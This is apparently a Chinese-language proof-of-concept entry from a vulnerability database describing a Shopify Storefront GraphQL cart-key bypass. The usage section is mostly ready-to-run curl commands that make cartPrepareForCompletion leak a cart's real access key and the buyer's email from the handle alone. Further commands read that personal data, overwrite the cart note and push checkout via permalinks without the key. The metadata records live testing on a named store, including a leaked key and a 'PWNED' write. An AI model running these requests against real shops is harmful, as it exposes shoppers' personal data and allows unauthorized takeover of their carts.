# Shopify Storefront cartPrepareForCompletion 忽略 ?key 并回显真实 cart key + buyer email → 仅凭 handle 升级为跨会话读写接管（推翻 KB#550 天花板）

- **code**: shopify-storefront-cartprepareforcompletion-忽略-key-并回显真实-ca
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront GraphQL（cartPrepareForCompletion / cartSubmitForCompletion / cart permalink）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 UTC，retro-refresh.com /api/graphql 匿名无 Cookie 实测：cartPrepareForCompletion(cartId=\"gid://shopify/Cart/<handle>\" 无 key) → 200 CartStatusNotReady，cart.id 回显真实 \"?key=0bbf56acb9526ca15ded541dcb15882b\" 且 buyerIdentity.email=victim-i1453@example.com；错 key 三态返回逐字相同，随机 handle → result:null。用泄露 key 读 email 并 cartNoteUpdate 改写 note 成功（读回 PWNED-i1453-VIA-PREPARE-KEYLEAK）。cartSubmitForCompletion 裸 handle 亦处理目标 cart 并回 checkoutUrl。GET /cart/c/<handle> 无 key/错 key 均 302 到 shop.app/checkout（随机 handle 404）。/api/2023-01、2024-01、2024-10、2025-04、unstable 五版本同样成立。其余 cart 写 mutation（delivery/lines/giftcard/billing/removePersonalData 等）均强制 key（新建空 cart + \"The specified cart does not exist.\"）。
- **tags**: shopify,storefront,graphql,cart,idor,unauthorized,key-bypass,prepare-for-completion,permalink
- **created_at**: 2026-11-11T17:04:00.732Z
- **engine**: https://retro-refresh.com

## 描述

Shopify 购物车 ?key 访问分量的完成流程绕过：cartPrepareForCompletion 不校验 key，并把 cart 对象的真实 key 与 buyerIdentity.email 回显给任意持有 25 位 handle 的匿名调用者；拿到 key 即可读 PII 并任意写车。cartSubmitForCompletion 同样忽略 key 处理目标 cart。cart permalink /cart/c/{handle} 去 key/错 key 仍 302 推进结账。影响随 handle 泄漏（分享链接/Referer/analytics）而定。

## 用法

```
前置：Shopify 托管店，Storefront API 匿名可达；已知目标 cart 25 位 handle（不可枚举）。

# 1) 仅凭 handle 让服务端吐出真实 key + 买家 email
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation { cartPrepareForCompletion(cartId: \"gid://shopify/Cart/<handle>\") { result { __typename ... on CartStatusNotReady { cart { id buyerIdentity { email } } } ... on CartStatusReady { cart { id buyerIdentity { email } } } } userErrors { code } } }"}'
# → 200 result.cart.id = gid://shopify/Cart/<handle>?key=<REAL_KEY>；buyerIdentity.email = 受害者邮箱
# 错 key（?key=deadbeef...）返回逐字相同；随机 handle → result:null

# 2) 用泄露的 REAL_KEY 读 PII / 写车
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{ cart(id: \"gid://shopify/Cart/<handle>?key=<REAL_KEY>\") { note buyerIdentity { email } } }"}'
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation { cartNoteUpdate(cartId: \"gid://shopify/Cart/<handle>?key=<REAL_KEY>\", note: \"PWNED\") { cart { id note } userErrors { field message } } }"}'

# 3) submitForCompletion 同样不校验 key（会处理目标 cart）
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation { cartSubmitForCompletion(cartId: \"gid://shopify/Cart/<handle>\", attemptToken: \"<任意>\") { result { __typename ... on SubmitFailed { checkoutUrl errors { code } } } userErrors { code } } }"}'

# 4) permalink 去 key 推进结账
curl -sk -o /dev/null -w '%{http_code} %{redirect_url}\n' 'https://<shop>/cart/c/<handle>'        # → 302 shop.app/checkout/...
curl -sk -o /dev/null -w '%{http_code} %{redirect_url}\n' 'https://<shop>/cart/c/<handle>?key=wrong' # → 302
# 对照：随机 handle → 404

# 5) 历史版本同样成立：/api/2023-01|2024-01|2024-10|2025-04|unstable/graphql 重复步骤 1

判据：prepare 响应 cart.id 带出真实 ?key 且 email 可见（三态逐字相同）；用该 key 写车成功即跨会话接管。其余写 mutation 无 key 应仍报 The specified cart does not exist.（新建空 cart）。
```
